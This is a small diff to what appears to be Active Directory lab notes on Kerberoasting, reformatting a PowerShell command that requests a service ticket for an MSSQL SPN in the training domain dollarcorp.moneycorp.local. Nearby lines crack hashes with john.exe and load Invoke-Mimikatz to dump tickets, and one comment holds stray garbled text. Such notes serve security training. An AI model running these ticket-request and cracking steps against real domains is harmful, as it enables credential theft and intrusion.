@@ -32,7 +32,8 @@ C:> john.exe --wordlist=C:\AD\Tools\kerberoast\10k-worst-pass.txt C:\AD\Tools\ha
 ```powershell
 C:> Add-Type -AssemblyNAme System.IdentityModel
 
-C:> New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "MSSQLSvc/dcorp-mgmt.dollarcorp.moneycorp.local"
+C:> New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken 
+    -ArgumentList "MSSQLSvc/dcorp-mgmt.dollarcorp.moneycorp.local"
 
 # Dump account hashes to a `.kirbi` fileasd@service_asdasd
 C:> . .\Invoke-Mimikatz.ps1
